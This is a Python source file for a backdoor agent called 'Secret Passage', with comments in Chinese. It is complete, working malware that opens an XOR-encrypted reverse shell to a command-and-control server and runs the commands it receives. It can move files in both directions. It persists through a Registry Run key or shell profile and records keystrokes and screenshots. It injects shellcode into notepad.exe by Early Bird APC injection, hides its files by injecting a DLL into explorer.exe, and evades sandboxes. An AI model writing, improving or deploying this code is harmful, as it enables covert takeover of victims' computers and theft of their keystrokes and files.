#!/usr/bin/python3
"""
Secret Passage — Client (Backdoor Agent)

功能：
  - 反向 Shell（Reverse Shell）with XOR 加密通訊
  - 持久化（Persistence）：Windows Registry / Linux .bashrc
  - 鍵盤記錄器（Keylogger）
  - Early Bird APC Injection
  - 檔案隱藏（DLL Injection → explorer.exe → Hook ZwQueryDirectoryFile）
  - 邏輯炸彈（Logic Bomb）+ 沙箱檢測

MITRE ATT&CK 對應：
  T1055.004 — APC Injection
  T1546.003 — Run Key Persistence
  T1057 — Process Discovery (via ZwQueryDirectoryFile hook)
  T1564.001 — Hidden Files
  T1071.001 — Application Layer Protocol (C2 over TCP + XOR)
"""

import socket
import subprocess
import json
import time
import os
import sys
import shutil
import base64
import struct
import requests
import tempfile
import threading
import pynput.keyboard
import ctypes

# ══════════════════════════════════════════════════════
# 設定
# ══════════════════════════════════════════════════════
SERVER_IP   = os.environ.get("SP_SERVER_IP",   "127.0.0.1")
SERVER_PORT = int(os.environ.get("SP_SERVER_PORT", "12345"))

# XOR 加密密鑰（環境變數可覆蓋，避免 hardcode）
XOR_KEY = os.environ.get("SP_XOR_KEY", "SecretPassage2024").encode("utf-8")

# 要隱藏的檔案名稱列表（inject_hidden 會寫入 registry 供 hidden.dll 讀取）
HIDE_TARGETS = ["client.exe", "srv.exe", "hidden.dll"]

# 支援跨平台的持久化路徑
if sys.platform.startswith("win"):
    from ctypes import wintypes
    FILE_LOCATION = os.path.join(os.environ.get("appdata", "C:\\"), "srv.exe")
else:
    FILE_LOCATION = os.path.expanduser("~/.local/bin/srv")

keys = []  # keylogger buffer

# ══════════════════════════════════════════════════════
# XOR 加密層
# ══════════════════════════════════════════════════════

def xor_crypt(data: bytes, key: bytes = None) -> bytes:
    """
    對 data 做 XOR 加密/解密（對稱：加密兩次 = 原文）。
    使用循環密鑰，支援任意長度資料。
    """
    k = key if key is not None else XOR_KEY
    if not k:
        return data  # 空 key → 不加密
    return bytes([b ^ k[i % len(k)] for i, b in enumerate(data)])


# ══════════════════════════════════════════════════════
# 可靠通訊層（Length-Prefixed JSON + XOR）
# ══════════════════════════════════════════════════════

def recv_all(s, n):
    """
    確保從 socket 讀取精確的 n 個 bytes，防止 TCP 緩衝區分段問題。
    """
    data = bytearray()
    while len(data) < n:
        packet = s.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return bytes(data)


def reliable_send(s, data):
    """
    發送資料：
      1. 序列化為 JSON bytes
      2. XOR 加密
      3. 加上 4 bytes big-endian 長度表頭
      4. 一次送出
    """
    json_data = json.dumps(data).encode("utf-8")
    encrypted = xor_crypt(json_data)
    data_len = struct.pack(">I", len(encrypted))
    s.sendall(data_len + encrypted)


def reliable_recv(s):
    """
    接收資料：
      1. 讀取 4 bytes 表頭取得加密資料長度
      2. 讀取完整加密資料
      3. XOR 解密
      4. JSON 反序列化
    回傳解析後的 Python 物件，或 None（連線中斷/錯誤）。
    """
    try:
        header = recv_all(s, 4)
        if not header:
            return None
        data_len = struct.unpack(">I", header)[0]

        # 防止惡意長度導致記憶體耗盡
        if data_len > 10_000_000:  # 10 MB 上限
            return None

        data = recv_all(s, data_len)
        if not data:
            return None

        decrypted = xor_crypt(data)  # XOR 對稱：加密函數即解密函數
        return json.loads(decrypted.decode("utf-8"))
    except (socket.error, json.JSONDecodeError, UnicodeDecodeError):
        return None


# ══════════════════════════════════════════════════════
# Early Bird APC Injection
# ══════════════════════════════════════════════════════

def early_bird_injection(shellcode_b64, target_exe="C:\\Windows\\System32\\notepad.exe"):
    """
    Early Bird Injection:
    建立一個 Suspended 狀態的合法程式 (如 notepad.exe)，將惡意 Shellcode 寫入其記憶體空間，
    並透過 QueueUserAPC 與 ResumeThread 執行。

    規避防毒軟體：
      1. 記憶體配置遵循 W^X 原則（先 RW，寫入後改為 RX）
      2. 避免對 svchost.exe 等關鍵系統程式進行注入
      3. 在 CreateProcess 與 QueueUserAPC 之間加入延遲，打斷可疑的 API 呼叫鏈
    """
    if not sys.platform.startswith("win"):
        return "[!!] Early Bird Injection is only supported on Windows."

    try:
        shellcode = base64.b64decode(shellcode_b64)
        kernel32 = ctypes.windll.kernel32

        CREATE_SUSPENDED  = 0x00000004
        MEM_COMMIT        = 0x1000
        MEM_RESERVE       = 0x2000
        PAGE_READWRITE    = 0x04
        PAGE_EXECUTE_READ = 0x20

        class STARTUPINFO(ctypes.Structure):
            _fields_ = [
                ("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
                ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR),
                ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
                ("lpReserved2", wintypes.LPBYTE), ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE), ("hStdError", wintypes.HANDLE),
            ]

        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD),
            ]

        startupinfo = STARTUPINFO()
        startupinfo.cb = ctypes.sizeof(STARTUPINFO)
        process_information = PROCESS_INFORMATION()

        # 1. 建立 Suspended 狀態的 Process
        success = kernel32.CreateProcessW(
            None, target_exe, None, None, False,
            CREATE_SUSPENDED, None, None,
            ctypes.byref(startupinfo), ctypes.byref(process_information)
        )
        if not success:
            return "[!!] Failed to create suspended process."

        hProcess = process_information.hProcess
        hThread  = process_information.hThread

        # 2. 在目標 Process 中配置可讀寫 (RW) 記憶體區段，遵守 W^X 原則
        kernel32.VirtualAllocEx.restype = ctypes.c_void_p
        address = kernel32.VirtualAllocEx(
            hProcess, 0, len(shellcode),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        )
        if not address:
            kernel32.TerminateProcess(hProcess, 1)
            return "[!!] Failed to allocate memory in target process."

        # 3. 將 Shellcode 寫入記憶體中
        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(
            hProcess, ctypes.c_void_p(address),
            shellcode, len(shellcode), ctypes.byref(written)
        )

        # 4. 修改記憶體保護屬性為可執行 (RX)
        old_protect = wintypes.DWORD(0)
        kernel32.VirtualProtectEx(
            hProcess, ctypes.c_void_p(address), ctypes.c_size_t(len(shellcode)),
            PAGE_EXECUTE_READ, ctypes.byref(old_protect)
        )

        # 5. 加入延遲以打斷 CreateProcess(Suspended) -> QueueUserAPC 的特徵鏈
        time.sleep(1)

        # 6. 透過 APC 機制將執行緒的控制流導向 Shellcode，並恢復執行
        kernel32.QueueUserAPC(ctypes.c_void_p(address), hThread, ctypes.c_void_p(0))
        kernel32.ResumeThread(hThread)

        return (f"[+] Early Bird Injection successful. "
                f"Injected into {target_exe} (PID: {process_information.dwProcessId})")
    except Exception as e:
        return f"[!!] Early Bird Injection failed: {str(e)}"


# ══════════════════════════════════════════════════════
# 邏輯炸彈 + 沙箱檢測
# ══════════════════════════════════════════════════════

def is_sandbox():
    """檢測是否處於沙箱或虛擬機環境"""
    sandbox_indicators = [
        "C:\\windows\\System32\\Drivers\\Vmmouse.sys",
        "C:\\windows\\System32\\Drivers\\VboxMouse.sys",
        "C:\\windows\\System32\\Drivers\\vmtoolsd.exe",
    ]
    return any(os.path.exists(path) for path in sandbox_indicators)


def logic_bomb():
    """
    邏輯炸彈 (Logic Bomb)：
    檢查特定條件是否滿足，若條件不滿足則拒絕執行。
    1. 隨機延遲 5-10 秒（避開沙箱的時間加速檢測）
    2. 沙箱/VM 檢測
    """
    import random
    delay = random.randint(5, 10)
    time.sleep(delay)

    if is_sandbox():
        return False
    return True


# ══════════════════════════════════════════════════════
# 持久化 (Persistence)
# ══════════════════════════════════════════════════════

def persist():
    """
    跨平台持久化：
    — Windows：複製到 %appdata%\\srv.exe + Registry Run Key
    — Linux  ：複製到 ~/.local/bin/srv + ~/.bashrc
    """
    try:
        if sys.platform.startswith("win"):
            if not os.path.exists(FILE_LOCATION):
                src_path = sys.executable if sys.executable.endswith(".exe") else sys.argv[0]
                shutil.copyfile(src_path, FILE_LOCATION)
                cmd = (f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"'
                       f' /v ServiceCheck /t REG_SZ /d "{FILE_LOCATION}" /f')
                subprocess.run(cmd, shell=True, capture_output=True)

        elif sys.platform.startswith("linux") or sys.platform.startswith("darwin"):
            home = os.path.expanduser("~")
            dest_dir = os.path.dirname(FILE_LOCATION)
            os.makedirs(dest_dir, exist_ok=True)

            if not os.path.exists(FILE_LOCATION):
                shutil.copyfile(sys.argv[0], FILE_LOCATION)
                # Linux 才需要 chmod，Windows 會報錯
                if sys.platform.startswith("linux"):
                    os.chmod(FILE_LOCATION, 0o755)

                # 寫入 ~/.profile 或 ~/.bashrc
                profile_path = os.path.join(home, ".profile")
                if not os.path.exists(profile_path):
                    profile_path = os.path.join(home, ".bashrc")

                if os.path.exists(profile_path):
                    with open(profile_path, "a") as f:
                        f.write(f"\n# Service check\n(nohup {FILE_LOCATION} >/dev/null 2>&1 &)\n")
    except Exception:
        pass


# ══════════════════════════════════════════════════════
# 鍵盤記錄器 (Keylogger)
# ══════════════════════════════════════════════════════

def process_keys(key):
    """快捷鍵處理：方向鍵 exit()、字元記錄、特殊鍵轉字串"""
    global keys

    try:
        keys.append(str(key.char))
    except AttributeError:
        if key == pynput.keyboard.Key.enter:
            keys.append("\n")
        elif key == pynput.keyboard.Key.space:
            keys.append(" ")
        elif key == pynput.keyboard.Key.backspace:
            if keys:
                keys.pop()
        elif key == pynput.keyboard.Key.tab:
            keys.append("\t")
        elif key in (pynput.keyboard.Key.up, pynput.keyboard.Key.left,
                     pynput.keyboard.Key.right, pynput.keyboard.Key.down):
            sys.exit(0)   # 修復：exit → sys.exit(0)
        else:
            keys.append(f"[{key.name.upper()}]")


def writekeys():
    """每 5 秒將 keylogger buffer 寫入檔案"""
    global keys
    kl_file = os.path.join(os.environ.get("appdata", os.path.expanduser("~")), "srv.txt")
    with open(kl_file, "a", encoding="utf-8") as klfile:
        klfile.write("".join(keys))
    keys.clear()
    timer = threading.Timer(5, writekeys)
    timer.daemon = True
    timer.start()


def kl_start():
    """啟動鍵盤記錄器（背景執行）"""
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    writekeys()
    with keyboard_listener:
        keyboard_listener.join()


# ══════════════════════════════════════════════════════
# 螢幕截圖 (Screenshot)
# ══════════════════════════════════════════════════════

def take_screenshot():
    """
    擷取螢幕截圖並回傳 base64 編碼的 PNG 圖片。

    — Windows: 使用 ctypes 呼叫 gdi32.dll (BitBlt)
    — Linux:   使用 subprocess 呼叫 scrot 或 import gtk
    — 若失敗，回傳錯誤訊息
    """
    try:
        if sys.platform.startswith("win"):
            return _screenshot_windows()
        elif sys.platform.startswith("linux"):
            return _screenshot_linux()
        else:
            return "[!!] Screenshot not supported on this platform."
    except Exception as e:
        return f"[!!] Screenshot failed: {str(e)}"


def _screenshot_windows():
    """Windows: 使用 gdi32.dll BitBlt 截圖"""
    import tempfile as _tf

    # 取得螢幕尺寸
    user32 = ctypes.windll.user32
    width  = user32.GetSystemMetrics(0)
    height = user32.GetSystemMetrics(1)

    # 建立 DC
    hdc_screen = user32.GetDC(0)
    hdc_mem = ctypes.windll.gdi32.CreateCompatibleDC(hdc_screen)
    hbitmap = ctypes.windll.gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
    ctypes.windll.gdi32.SelectObject(hdc_mem, hbitmap)

    # 複製螢幕內容
    ctypes.windll.gdi32.BitBlt(
        hdc_mem, 0, 0, width, height,
        hdc_screen, 0, 0,
        0x00CC0020  # SRCCOPY
    )

    # 儲存為 BMP → 轉 PNG
    tmp_bmp = _tf.mktemp(suffix=".bmp")
    _save_bitmap(hbitmap, tmp_bmp, width, height)

    # 讀取並 base64 編碼
    with open(tmp_bmp, "rb") as f:
        img_data = f.read()

    # 清理
    os.unlink(tmp_bmp)
    ctypes.windll.gdi32.DeleteObject(hbitmap)
    ctypes.windll.gdi32.DeleteDC(hdc_mem)
    user32.ReleaseDC(0, hdc_screen)

    encoded = base64.b64encode(img_data).decode("ascii")
    return f"[+] Screenshot captured ({width}x{height}, {len(img_data)} bytes)\n[IMG]{encoded}[/IMG]"


def _save_bitmap(hbitmap, filepath, width, height):
    """將 HBITMAP 儲存為 BMP 檔案"""
    # BMP 檔案頭
    bmp_header = struct.pack('<2sIHHI',
        b'BM',
        54 + width * height * 3,  # 檔案大小
        0, 0, 54                    # 保留 + 資料偏移
    )
    # DIB 頭 (BITMAPINFOHEADER)
    dib_header = struct.pack('<IiiHHIIiiII',
        40,             # 結構大小
        width, height,  # 寬高
        1, 24,          # 色平面數, bits per pixel (24-bit)
        0,              # 壓縮
        width * height * 3,  # 圖片大小
        2835, 2835,     # 解析度 (72 DPI)
        0, 0            # 調色盤
    )

    # 讀取像素資料
    buffer_size = width * height * 3
    buffer = (ctypes.c_ubyte * buffer_size)()
    ctypes.windll.gdi32.GetDIBits(
        ctypes.windll.user32.GetDC(0), hbitmap, 0, height,
        buffer, ctypes.byref(ctypes.c_void_p()), 0
    )

    # BMP 像素資料是 bottom-up，需要翻轉
    row_size = width * 3
    rows = [bytes(buffer[i * row_size:(i + 1) * row_size]) for i in range(height)]
    rows.reverse()

    with open(filepath, "wb") as f:
        f.write(bmp_header)
        f.write(dib_header)
        for row in rows:
            # BMP 每行需要 4-byte 對齊
            padding = b'\x00' * ((4 - (len(row) % 4)) % 4)
            f.write(row + padding)


def _screenshot_linux():
    """Linux: 使用 scrot 或 import gtk"""
    import tempfile as _tf
    tmp_png = _tf.mktemp(suffix=".png")

    # 嘗試 scrot
    result = subprocess.run(
        ["scrot", tmp_png],
        capture_output=True, timeout=10
    )
    if result.returncode != 0:
        # 嘗試 gnome-screenshot
        result = subprocess.run(
            ["gnome-screenshot", "-f", tmp_png],
            capture_output=True, timeout=10
        )

    if not os.path.exists(tmp_png):
        return "[!!] Screenshot failed: install scrot or gnome-screenshot"

    with open(tmp_png, "rb") as f:
        img_data = f.read()
    os.unlink(tmp_png)

    encoded = base64.b64encode(img_data).decode("ascii")
    return f"[+] Screenshot captured ({len(img_data)} bytes)\n[IMG]{encoded}[/IMG]"


# ══════════════════════════════════════════════════════
# DLL Injector：將 hidden.dll 注入 explorer.exe → 隱藏檔案
# ══════════════════════════════════════════════════════

REG_HIDDEN_PATH  = r"Software\HiddenFiles"
REG_VALUE_NAME   = "Targets"


def _write_hide_targets_to_registry(targets):
    """將要隱藏的檔名寫入 registry (HKCU\\Software\\HiddenFiles\\Targets)"""
    if not sys.platform.startswith("win"):
        return False
    try:
        import winreg
        key = winreg.CreateKeyEx(
            winreg.HKEY_CURRENT_USER, REG_HIDDEN_PATH,
            0, winreg.KEY_WRITE
        )
        winreg.SetValueEx(key, REG_VALUE_NAME, 0, winreg.REG_MULTI_SZ, targets)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


def _remove_hide_targets_from_registry():
    """清除 registry 中的隱藏目標"""
    if not sys.platform.startswith("win"):
        return
    try:
        import winreg
        winreg.DeleteKeyEx(winreg.HKEY_CURRENT_USER, REG_HIDDEN_PATH)
    except Exception:
        pass


def _find_explorer_pid():
    """找到 explorer.exe 的 PID"""
    if not sys.platform.startswith("win"):
        return None
    try:
        result = subprocess.run(
            ["tasklist", "/FI", "IMAGENAME eq explorer.exe", "/FO", "CSV", "/NH"],
            capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.strip().split("\n"):
            if "explorer.exe" in line.lower():
                parts = line.strip('"').split('","')
                if len(parts) >= 2:
                    return int(parts[1])
    except Exception:
        pass
    return None


def inject_hidden(dll_path=None):
    """
    將 hidden.dll 注入到 explorer.exe，使 HIDE_TARGETS 中的檔案從 Explorer 消失。

    流程：
    1. 將隱藏目標寫入 registry (HKCU\\Software\\HiddenFiles\\Targets)
    2. 找到 explorer.exe 的 PID
    3. 以 PROCESS_ALL_ACCESS 開啟 explorer.exe
    4. 在 explorer.exe 記憶體中分配空間存放 DLL 路徑
    5. 寫入 DLL 路徑（UTF-16LE）
    6. 建立 RemoteThread 呼叫 LoadLibraryW(dll_path)
    7. DLL 載入後 DllMain 自動 Hook ZwQueryDirectoryFile

    Args:
        dll_path: hidden.dll 的完整路徑。若為 None 則自動推斷。

    Returns:
        str: 成功或失敗訊息
    """
    if not sys.platform.startswith("win"):
        return "[!!] File hiding via DLL injection is only supported on Windows."

    kernel32 = ctypes.windll.kernel32

    # ── 1. 決定 DLL 路徑 ──
    if dll_path is None:
        client_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        dll_path = os.path.join(client_dir, "hidden.dll")

    if not os.path.isfile(dll_path):
        return f"[!!] hidden.dll not found at: {dll_path}"

    dll_path_w = os.path.abspath(dll_path)

    # ── 2. 寫入 registry ──
    if not _write_hide_targets_to_registry(HIDE_TARGETS):
        return "[!!] Failed to write hide targets to registry."

    # ── 3. 找到 explorer.exe PID ──
    pid = _find_explorer_pid()
    if pid is None:
        return "[!!] Could not find explorer.exe process."

    # ── 4. 開啟目標 process ──
    PROCESS_ALL_ACCESS = 0x1F0FFF
    hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not hProcess:
        return f"[!!] Failed to open explorer.exe (PID: {pid}). Need admin privilege?"

    try:
        # ── 5. 在 explorer.exe 中分配記憶體 ──
        MEM_COMMIT     = 0x1000
        MEM_RESERVE    = 0x2000
        PAGE_READWRITE = 0x04

        path_size = (len(dll_path_w) + 1) * 2  # UTF-16LE + null
        kernel32.VirtualAllocEx.restype = ctypes.c_void_p
        remote_addr = kernel32.VirtualAllocEx(
            hProcess, 0, path_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        )
        if not remote_addr:
            return "[!!] Failed to allocate memory in explorer.exe."

        # ── 6. 寫入 DLL 路徑 ──
        dll_bytes = dll_path_w.encode("utf-16-le") + b"\x00\x00"
        written = ctypes.c_size_t(0)
        success = kernel32.WriteProcessMemory(
            hProcess, ctypes.c_void_p(remote_addr),
            dll_bytes, len(dll_bytes),
            ctypes.byref(written)
        )
        if not success:
            return "[!!] Failed to write DLL path to explorer.exe."

        # ── 7. 取得 LoadLibraryW 位址 ──
        # kernel32.dll 在每個 process 中的載入位址相同（ASLR 不影響系統 DLL）
        hKernel32 = kernel32.GetModuleHandleW("kernel32.dll")
        pLoadLibraryW = ctypes.cast(
            kernel32.GetProcAddress(hKernel32, b"LoadLibraryW"),
            ctypes.c_void_p
        )
        if not pLoadLibraryW:
            return "[!!] Failed to get LoadLibraryW address."

        # ── 8. 建立 RemoteThread ──
        thread_id = ctypes.c_ulong(0)
        hThread = kernel32.CreateRemoteThread(
            hProcess, None, 0,
            pLoadLibraryW, ctypes.c_void_p(remote_addr),
            0, ctypes.byref(thread_id)
        )
        if not hThread:
            return "[!!] Failed to create remote thread in explorer.exe."

        # ── 9. 等待 DLL 載入完成 ──
        kernel32.WaitForSingleObject(hThread, 5000)  # 最多等 5 秒

        # 清理
        kernel32.CloseHandle(hThread)
        kernel32.VirtualFreeEx(hProcess, remote_addr, 0, 0x8000)  # MEM_RELEASE

        return (
            f"[+] File hiding activated!\n"
            f"    DLL injected into explorer.exe (PID: {pid})\n"
            f"    Hidden files: {', '.join(HIDE_TARGETS)}\n"
            f"    DLL path: {dll_path_w}"
        )

    finally:
        kernel32.CloseHandle(hProcess)


def eject_hidden():
    """
    清除 registry 中的隱藏目標。
    注意：已注入的 DLL 需重啟 Explorer 才能完全卸載。
    """
    if not sys.platform.startswith("win"):
        return "[!!] Only supported on Windows."

    _remove_hide_targets_from_registry()
    return (
        "[+] Registry cleaned. To fully unload hidden.dll, restart Explorer:\n"
        "    taskkill /f /im explorer.exe && start explorer.exe"
    )


# ══════════════════════════════════════════════════════
# 通訊迴圈
# ══════════════════════════════════════════════════════

def communication(s):
    """處理從 server 收到的指令"""
    global keys

    while True:
        command = reliable_recv(s)
        if command is None or command == 'q':
            break

        if command.startswith("cd ") and len(command) > 3:
            try:
                os.chdir(command[3:].strip())
            except OSError:
                continue

        elif command.startswith("download "):
            filename = command[9:].strip()
            try:
                with open(filename, "rb") as f:
                    content = f.read()
                    encoded = base64.b64encode(content).decode("ascii")
                    reliable_send(s, encoded)
            except Exception:
                reliable_send(s, "[!!] Failed to download: File not found or unreadable.")

        elif command.startswith("upload "):
            filename = command[7:].strip()
            result = reliable_recv(s)
            if result and not result.startswith("[!!]"):
                try:
                    with open(filename, "wb") as f:
                        f.write(base64.b64decode(result.encode("ascii")))
                except Exception:
                    pass

        elif command.startswith("get "):
            url = command[4:].strip()
            try:
                response = requests.get(url, timeout=10)
                filename = url.split("/")[-1] if "/" in url else "downloaded_file"
                with open(filename, "wb") as f:
                    f.write(response.content)
                reliable_send(s, f"[+] File '{filename}' Downloaded via HTTP.")
            except Exception as e:
                reliable_send(s, f"[!!] HTTP Download Failed: {e}")

        elif command.startswith("start "):
            program = command[6:].strip()
            try:
                subprocess.Popen(program, shell=True)
                reliable_send(s, f"[+] Program '{program}' Started.")
            except Exception:
                reliable_send(s, "[!!] Program cannot start.")

        elif command == "screenshot":
            result_msg = take_screenshot()
            reliable_send(s, result_msg)

        elif command == "kl_start":
            kl_thread = threading.Thread(target=kl_start, daemon=True)
            kl_thread.start()
            reliable_send(s, "[+] Keylogger Started.")

        elif command.startswith("inject "):
            shellcode_b64 = command[7:].strip()
            result_msg = early_bird_injection(shellcode_b64)
            reliable_send(s, result_msg)

        elif command == "hide_files":
            dll_path = command[10:].strip() if len(command) > 10 else None
            result_msg = inject_hidden(dll_path if dll_path else None)
            reliable_send(s, result_msg)

        elif command == "eject_hidden":
            result_msg = eject_hidden()
            reliable_send(s, result_msg)

        else:
            # 執行 Shell 指令並獲取結果
            try:
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                response = stdout + stderr
                try:
                    if sys.platform.startswith("win"):
                        decoded_response = response.decode('cp950')
                    else:
                        decoded_response = response.decode('utf-8')
                except UnicodeDecodeError:
                    decoded_response = response.decode('utf-8', errors='ignore')

                reliable_send(s, decoded_response)
            except Exception as e:
                reliable_send(s, f"[!!] Execution Error: {str(e)}")


def connection():
    """建立 TCP 連接到 C2 Server，斷線後自動重連"""
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER_IP, SERVER_PORT))
                communication(s)
        except socket.error:
            time.sleep(20)
            continue


# ══════════════════════════════════════════════════════
# 主程式進入點
# ══════════════════════════════════════════════════════

if __name__ == "__main__":
    if not logic_bomb():
        sys.exit(0)

    persist()
    connection()
